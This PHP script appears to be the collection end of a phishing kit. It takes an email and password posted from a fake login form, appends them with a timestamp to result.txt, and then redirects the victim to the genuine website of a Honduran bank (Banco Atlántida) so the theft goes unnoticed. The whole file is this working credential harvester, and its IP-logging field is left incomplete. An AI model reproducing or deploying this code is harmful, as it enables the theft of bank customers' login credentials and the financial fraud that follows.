<?php
$correo = $_POST['correo'];
$contra = $_POST['contra'];
$fecha = date("d/m/y g:i:s");
$file = fopen ('result.txt', 'at');
fwrite($file, "correo: $correo | contrasea: $contra | fecha: $fecha |ip $\n");
fclose($file);
header("location:https://www.bancatlan.hn/");

?>